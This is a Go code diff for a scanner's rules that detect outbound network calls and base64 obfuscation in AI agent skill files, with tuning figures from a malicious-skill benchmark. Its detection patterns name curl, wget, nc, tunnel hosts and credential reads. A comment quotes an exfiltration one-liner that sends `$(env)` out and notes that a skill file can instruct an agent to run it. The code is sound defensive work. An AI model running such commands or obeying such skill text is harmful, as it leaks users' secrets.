@@ -2,6 +2,8 @@ package rules
 
 import (
 	"bytes"
+	"net"
+	"net/url"
 	"regexp"
 	"strings"
 
@@ -11,10 +13,20 @@ import (
 
 // SD-007: Outbound network call patterns.
 var (
-	reNetworkCommand = regexp.MustCompile(`\b(curl|wget|fetch|nc|ncat)\s+`)
-	reHTTPURL        = regexp.MustCompile(`https?://[^\s"')\]>]+`)
-	reRequestsLib    = regexp.MustCompile(`\b(requests\.(get|post|put|delete|patch)|urllib\.request|fetch\()`)
-	reGitFetch       = regexp.MustCompile(`\bgit\s+fetch\b`)
+	// `fetch` is only a network command when it is a call. Bare `fetch\s+`
+	// matched the English verb — "a script to fetch live data", "not visible
+	// to fetch" — which produced 59 findings on benign skills and 103 on
+	// malicious ones, i.e. noise on both sides of the label. The JS
+	// `fetch(...)` form is covered by reRequestsLib.
+	reNetworkCommand = regexp.MustCompile(`\b(curl|wget|ncat|nc)\s+|\bfetch\s+(-|https?://)`)
+	// A bracketed IPv6 host needs its own alternative: the general class
+	// excludes `]`, so `http://[fd00:ec2::254]/…` was cut at the bracket and
+	// the address never reached suspiciousEndpoint. Harmless while every match
+	// took the registered severity; it decides the axis now.
+	reHTTPURL = regexp.MustCompile(`https?://\[[^\]\s"'` + "`" + `]+\][^\s"')>]*` +
+		`|https?://[^\s"')\]>]+`)
+	reRequestsLib = regexp.MustCompile(`\b(requests\.(get|post|put|delete|patch)|urllib\.request|fetch\()`)
+	reGitFetch    = regexp.MustCompile(`\bgit\s+fetch\b`)
 )
 
 // SD-008: Base64 obfuscation patterns.
@@ -23,45 +35,267 @@ var (
 	reBase64Inline  = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)
 	reBase64Decode  = regexp.MustCompile(`\b(atob|b64decode|Base64\.decode|base64\.b64decode)\s*\(`)
 	reHashLine      = regexp.MustCompile(`(?i)(sha(256|512|1)?|md5|checksum|hash)\s*[:=]`)
+
+	// A long run of base64 characters is not evidence of a payload. Measured
+	// on MalSkillBench, the inline branch produced 402 findings on benign
+	// skills and 171 on malicious ones, and both sides were mostly these:
+	//
+	//   reSRIHash  — npm/yarn lockfile integrity values. 322 benign hits,
+	//                zero malicious ones.
+	//   reHexBlob  — a blockchain address or key written as hex.
+	//   path-like  — `/` is in the base64 alphabet, so any deep path matched:
+	//                `~/.claude/skills/CORE/USER/SKILLCUSTOMIZATIONS/Art/`.
+	//   low entropy — a single-case run carries no encoded payload.
+	//
+	// Damping these keeps 69 of the malicious hits and 3 of the benign ones.
+	reSRIHash = regexp.MustCompile(`(?i)"integrity"\s*:|\bsha(1|256|384|512)-`)
+	reHexBlob = regexp.MustCompile(`\b0x[0-9a-fA-F]{20,}`)
 )
+
+// tunnelOrPasteHosts are hosts that exist to be temporary: request bins,
+// ephemeral tunnels and free subdomain hosts. A published API lives on a
+// stable domain; a collection endpoint frequently does not.
+var tunnelOrPasteHosts = regexp.MustCompile(`(?i)(^|\.)(ngrok-free\.app|ngrok\.io|trycloudflare\.com|pythonanywhere\.com|webhook\.site|pipedream\.net|requestbin\.[a-z]+|burpcollaborator\.net|serveo\.net|localtunnel\.me|oastify\.com|interact\.sh)$`)
+
+// internalHosts are names that only resolve inside a cloud instance or a
+// private network: the GCP metadata server and anything under the `.internal`
+// private TLD. A published API does not live there, which is the same
+// criterion the IP and port tests apply — this just covers the hosts that
+// carry a name.
+var internalHosts = regexp.MustCompile(`(?i)^(metadata|metadata\.google\.internal|metadata\.goog)$|\.internal$`)
+
+// isPackedIPv4 reports whether a host is one of the numeric spellings of an
+// IPv4 address that net.ParseIP rejects: `2130706433` and `0x7f000001` are
+// both 127.0.0.1. No published API is addressed this way, and nothing
+// documents it innocently.
+func isPackedIPv4(host string) bool {
+	if host == "" {
+		return false
+	}
+	if strings.HasPrefix(host, "0x") || strings.HasPrefix(host, "0X") {
+		if len(host) < 3 {
+			return false
+		}
+		for _, c := range host[2:] {
+			if (c < '0' || c > '9') && (c < 'a' || c > 'f') && (c < 'A' || c > 'F') {
+				return false
+			}
+		}
+		return true
+	}
+	for _, c := range host {
+		if c < '0' || c > '9' {
+			return false
+		}
+	}
+	return true
+}
+
+// suspiciousEndpoint reports whether a URL's host is one a published service
+// would not use: a bare IP address in any spelling, a non-standard port, an
+// internal-only name, or an ephemeral tunnel/request-bin host.
+//
+// This is the only signal that separates the two populations at scale. On
+// MalSkillBench, an IP literal appears in 14.8% of malicious SD-007 hits and
+// 3.4% of benign ones; by contrast a `$(...)` substitution in the same
+// statement carries almost no signal (10.3% vs 8.0%), and an environment
+// variable is *more* common in benign skills (24.5% vs 3.3%) because that is
+// how an API token reaches an Authorization header.
+func suspiciousEndpoint(raw string) bool {
+	raw = strings.Trim(raw, `"'`+"`"+`,;)`)
+	u, err := url.Parse(raw)
+	if err != nil || u.Host == "" {
+		return false
+	}
+	host := u.Hostname()
+	if net.ParseIP(host) != nil || isPackedIPv4(host) {
+		return true
+	}
+	if internalHosts.MatchString(host) {
+		return true
+	}
+	if p := u.Port(); p != "" && p != "80" && p != "443" {
+		return true
+	}
+	return tunnelOrPasteHosts.MatchString(host)
+}
+
+// reLocalDataSubst matches a command substitution that reads local state:
+// `$(env)`, `$(cat ~/.aws/credentials)`, backticked `ps auxeww`. Coverage is
+// small — 1.6% of malicious SD-007 hits against 0.2% of benign — but it is
+// the shape of the canonical exfiltration one-liner, and in an agent manifest
+// the documentation *is* the program: a SKILL.md that says
+// `curl -d "$(env)" https://collector...` is not describing an endpoint, it
+// is instructing the agent to send the environment.
+var (
+	reCmdSubst  = regexp.MustCompile("\\$\\(|`")
+	reLocalRead = regexp.MustCompile(`\b(env|printenv|cat|ps|whoami|hostname|uname|id|base64|tar|zip|gpg|security|find)\b`)
+	reDataFlag  = regexp.MustCompile(`(^|\s)(-d|--data|--data-binary|--data-raw|--form|-F)(\s|=)`)
+)
+
+// reFileUpload matches the request-body flags whose value is a file rather
+// than literal content: `-d @path`, `--data-binary @path`, `-F field=@path`,
+// and wget's `--post-file=path`. These read a local file straight into the
+// request with no command substitution anywhere, which is why they are tested
+// independently of reCmdSubst — the repo's own canonical SD-007 fixture uses
+// this form.
+//
+// Two things the pattern has to get right:
+//
+//   - The `@` must open the argument, or a `field=` value. Allowing it
+//     anywhere made an email address in a literal body —
+//     `-d '{"email":"user@example.com"}'` — read as a file upload.
+//   - A short option's value may be attached: curl parses `-d@FILE` exactly
+//     as `-d @FILE` (verified against curl 8.7.1 — both fail with "error
+//     encountered when reading a file", where a literal body reaches the
+//     connection attempt). Requiring a separator made the check a
+//     one-character evasion.
+//
+// pathArg is what an upload flag's value looks like when it names a file:
+// an absolute or home-rooted path, a `./` relative one, or any of those
+// written through a variable. The trailing slash after the variable is what
+// makes `$HOME/.aws/credentials` a path and `$TIMEOUT` a number — without it,
+// widening to variables would let wget's timeout back in.
+const pathArg = `(~/|\./|/|\$\{?\w+\}?/)`
+
+var reFileUpload = regexp.MustCompile(
+	`(^|\s)(-d|-F)\s*` + "`" + `?['"]?(@|[\w.\[\]-]+=@)` + "`" + `?['"]?(` + pathArg + `|[\w~.])` +
+		`|(^|\s)(--data(-ascii|-binary|-raw|-urlencode)?|--form)(\s+|=)` + "`" + `?['"]?(@|[\w.\[\]-]+=@)` + "`" + `?['"]?(` + pathArg + `|[\w~.])`)
+
+// reUploadFlag matches an upload flag whose argument is a path: `-T`,
+// `--upload-file`, and wget's `--post-file`.
+//
+// The argument's shape is the whole test, deliberately. Earlier versions asked
+// which command the flag belonged to — anchoring to `curl`, then splitting the
+// statement on shell separators to bind the flag to one command — because GNU
+// wget's `-T` is `--timeout` and `wget -T 30` must not read as an upload.
+// Every one of those versions was wrong about shell syntax in a new way: a
+// newline inside a joined statement, an `&` inside a quoted query string, the
+// word "curl" in a trailing comment.
+//
+// None of that is what the demotion needs to know. This flag's argument is
+// either a file or a number of seconds: a path is `~/…`, `/…` or `./…`, and a
+// timeout is digits — including when the path is written through a variable,
+// where the slash after it is what separates `$HOME/.aws/…` from `$TIMEOUT`.
+// Testing the argument separates them without knowing where any command
+// begins, which is why this rule no longer parses shell at all.
+//
+// The cost, stated plainly: `curl -T data.json https://…` — a bare relative
+// filename — no longer reads as sending local state. Uploading a file from the
+// skill's own directory is not the shape this is looking for.
+var reUploadFlag = regexp.MustCompile(`(^|\s)(-T|--upload-file|--post-file)\s*=?` + "`" + `?['"]?` + pathArg + `\S`)
+
+// exfiltratesLocalData reports whether the statement pipes local state into
+// the request rather than sending literal or user-supplied content.
+func exfiltratesLocalData(stmt string) bool {
+	if reFileUpload.MatchString(stmt) || reUploadFlag.MatchString(stmt) {
+		return true
+	}
+	if !reCmdSubst.MatchString(stmt) {
+		return false
+	}
+	return reLocalRead.MatchString(stmt) || reDataFlag.MatchString(stmt)
+}
+
+// shellStatement joins line i with its backslash continuations, so a request
+// split across lines is judged as one command. It returns the joined text and
+// how many lines it consumed, because the caller must skip those: judging a
+// continuation line as its own statement made one wrapped command produce a
+// finding per line. Bounded, so a runaway file of trailing backslashes cannot
+// turn one finding into a whole-file read.
+func shellStatement(lines [][]byte, i int) (string, int) {
+	const maxJoin = 8
+	var b strings.Builder
+	written := 0
+	for n := 0; i+n < len(lines) && n < maxJoin; n++ {
+		b.Write(lines[i+n])
+		written++
+		if !bytes.HasSuffix(bytes.TrimRight(lines[i+n], "\r"), []byte("\\")) {
+			break
+		}
+		b.WriteByte('\n')
+	}
+	// Count what was written, not where the loop variable ended up. On the
+	// maxJoin path the loop exits with n one past the last line written, and
+	// reporting that let the caller skip a line nothing had scanned — eight
+	// continuations were enough to hide the next call from the rule.
+	return b.String(), written
+}
 
 type networkCallRule struct {
 	baseRule
+}
+
+// endpointFinding emits an SD-007 finding, choosing between the two things
+// this pattern can mean.
+//
+// In a documentation file, `curl https://api.notion.com/v1/pages` is a Notion
+// skill telling the reader which endpoint it uses. That is a disclosure, not
+// a vulnerability, and rating it High on the security axis caps an honest
+// skill at D — measured as 74 of 137 false positives on a benign corpus. The
+// same line inside a script is not a declaration: it runs. And any host that
+// a published API would not use stays High wherever it appears.
+func (r *networkCallRule) endpointFinding(ctx model.FileContext, line int, url, stmt string, declared bool, desc string) model.Finding {
+	if declared && url != "" && !suspiciousEndpoint(url) && !exfiltratesLocalData(stmt) {
+		return r.newFindingAs(ctx, line, model.SeverityMedium, axes.Transparency,
+			"documented endpoint "+url,
+			"Confirm the skill's documentation matches what it actually contacts")
+	}
+	return r.newFinding(ctx, line, desc,
+		"Remove or restrict outbound network calls; document why external access is needed")
 }
 
 func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.Finding {
 	if !IsAgentFile(ctx.Path) && !isInAgentConfigDir(ctx.Path) {
 		return nil
 	}
-	docFile := isDocFile(ctx.Path)
+	declared := isDocFile(ctx.Path) || isDeclarativeFile(ctx.Path)
 	var findings []model.Finding
 	lines := bytes.Split(content, []byte("\n"))
-	for i, line := range lines {
+	for i := 0; i < len(lines); i++ {
+		line := lines[i]
 		lineNum := i + 1
-		urlMatch := reHTTPURL.Find(line)
+		// The URL frequently sits on a backslash continuation of the same
+		// command, so read it from the whole statement, not the first line —
+		// and skip the lines that statement consumed, or each of them is
+		// judged again as a statement of its own.
+		stmt, consumed := shellStatement(lines, i)
+		i += consumed - 1
+		urlMatch := reHTTPURL.FindString(stmt)
 		if reNetworkCommand.Match(line) && !reGitFetch.Match(line) {
 			desc := "outbound network call detected"
-			if urlMatch != nil {
-				desc = "outbound network call to " + string(urlMatch)
+			if urlMatch != "" {
+				desc = "outbound network call to " + urlMatch
 			}
-			findings = append(findings, r.newFinding(ctx, lineNum,
-				desc,
-				"Remove or restrict outbound network calls; document why external access is needed"))
+			findings = append(findings, r.endpointFinding(ctx, lineNum, urlMatch, stmt, declared, desc))
 			continue
 		}
 		if reRequestsLib.Match(line) {
 			desc := "outbound network call via library"
-			if urlMatch != nil {
-				desc = "outbound network call via library to " + string(urlMatch)
+			if urlMatch != "" {
+				desc = "outbound network call via library to " + urlMatch
 			}
-			findings = append(findings, r.newFinding(ctx, lineNum,
-				desc,
-				"Remove or restrict outbound network calls; document why external access is needed"))
+			findings = append(findings, r.endpointFinding(ctx, lineNum, urlMatch, stmt, declared, desc))
 			continue
 		}
-		if urlMatch != nil && !docFile {
+		// A bare URL with no call around it. In prose it is a link and says
+		// nothing about behaviour, so it stays silent. In structured data it
+		// is a declared endpoint: worth surfacing on transparency, never a
+		// security defect on its own.
+		if urlMatch == "" {
+			continue
+		}
+		switch {
+		case isDocFile(ctx.Path):
+			// silent
+		case isDeclarativeFile(ctx.Path) && !suspiciousEndpoint(urlMatch):
+			findings = append(findings, r.newFindingAs(ctx, lineNum,
+				model.SeverityMedium, axes.Transparency,
+				"declared endpoint "+urlMatch,
+				"Confirm the skill's configuration matches what it actually contacts"))
+		default:
 			findings = append(findings, r.newFinding(ctx, lineNum,
-				"outbound network reference to "+string(urlMatch),
+				"outbound network reference to "+urlMatch,
 				"Remove or restrict outbound network references; document why external access is needed"))
 		}
 	}
@@ -92,8 +326,11 @@ func (r *base64ObfuscationRule) Match(content []byte, ctx model.FileContext) []m
 				"Avoid using base64 to decode data at runtime; use plaintext configuration instead"))
 			continue
 		}
-		// Inline base64 string — skip if the match is inside a URL or the line is a hash.
-		if b64Loc := reBase64Inline.FindIndex(line); b64Loc != nil && !reHashLine.Match(line) {
+		// Inline base64 string — skip if the match is inside a URL, the line is
+		// a hash, or the token is one of the shapes that share base64's
+		// alphabet without carrying a payload.
+		if b64Loc := reBase64Inline.FindIndex(line); b64Loc != nil && !reHashLine.Match(line) &&
+			!reSRIHash.Match(line) && !reHexBlob.Match(line) && isEncodedPayload(line[b64Loc[0]:b64Loc[1]]) {
 			inURL := false
 			for _, urlLoc := range reHTTPURL.FindAllIndex(line, -1) {
 				if b64Loc[0] >= urlLoc[0] && b64Loc[1] <= urlLoc[1] {
@@ -111,6 +348,69 @@ func (r *base64ObfuscationRule) Match(content []byte, ctx model.FileContext) []m
 	return findings
 }
 
+// looksLikePath reports whether a token is a filesystem path rather than an
+// encoding. "Contains a slash" is not that test: `/` is in the base64 alphabet,
+// and over 20000 encodings of 30 random bytes, 24.8% contain a `/` with no `+`
+// and no padding — so the earlier version discarded a quarter of all genuine
+// payloads.
+//
+// What actually separates them is case stability. A path is several word-like
+// segments: `claude/skills/CORE/USER/Art` flips between upper and lower case
+// on 2% of its character boundaries, where base64 of random bytes flips on
+// 33%. Measured against the corpus, this catches 74.5% of the path tokens and
+// discards 0 of 20000 genuine payloads — the direction to err in, since a
+// missed payload is a missed attack and a surviving path is one noisy line.
+func looksLikePath(tok []byte) bool {
+	segments := 0
+	for _, s := range bytes.Split(tok, []byte("/")) {
+		if len(s) > 0 {
+			segments++
+		}
+	}
+	if segments < 3 {
+		return false
+	}
+	var flips, boundaries int
+	for i := 1; i < len(tok); i++ {
+		a, b := tok[i-1], tok[i]
+		if !isASCIILetter(a) || !isASCIILetter(b) {
+			continue
+		}
+		boundaries++
+		if isASCIIUpper(a) != isASCIIUpper(b) {
+			flips++
+		}
+	}
+	return boundaries > 0 && float64(flips)/float64(boundaries) < 0.10
+}
+
+func isASCIILetter(c byte) bool {
+	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
+}
+
+func isASCIIUpper(c byte) bool { return c >= 'A' && c <= 'Z' }
+
+// isEncodedPayload reports whether a run of base64 characters plausibly
+// encodes something, as opposed to being a filesystem path or a single-case
+// identifier that happens to use the same alphabet.
+func isEncodedPayload(tok []byte) bool {
+	if looksLikePath(tok) {
+		return false
+	}
+	var lower, upper, digit bool
+	for _, c := range tok {
+		switch {
+		case c >= 'a' && c <= 'z':
+			lower = true
+		case c >= 'A' && c <= 'Z':
+			upper = true
+		case c >= '0' && c <= '9', c == '+', c == '/':
+			digit = true
+		}
+	}
+	return lower && upper && digit
+}
+
 // isDocFile reports whether the path looks like a documentation file
 // where a bare URL reference is expected noise, not an executable call.
 func isDocFile(path string) bool {
@@ -118,6 +418,26 @@ func isDocFile(path string) bool {
 	return strings.HasSuffix(p, ".md") ||
 		strings.HasSuffix(p, ".txt") ||
 		strings.HasSuffix(p, ".rst")
+}
+
+// isDeclarativeFile reports whether the path is structured data rather than
+// code or prose: a manifest, a lockfile, a compose file. A URL there is a
+// declaration — a registry the package came from, a service a config points
+// at — and never a call this file makes.
+//
+// Measured: on MalSkillBench these files carry 146 SD-007 hits on benign
+// skills (npm lockfile registry URLs, mostly) against 2 on malicious ones.
+// The agent-config members of this family have dedicated rules already —
+// SD-021 for MCP endpoints, SD-017/SD-019 for settings.json — so SD-007's
+// contribution here is noise on top of coverage that exists elsewhere.
+func isDeclarativeFile(path string) bool {
+	p := strings.ToLower(path)
+	for _, ext := range []string{".json", ".yaml", ".yml", ".toml", ".lock", ".xml"} {
+		if strings.HasSuffix(p, ext) {
+			return true
+		}
+	}
+	return false
 }
 
 // RegisterExfiltrationRules registers all exfiltration detection rules.
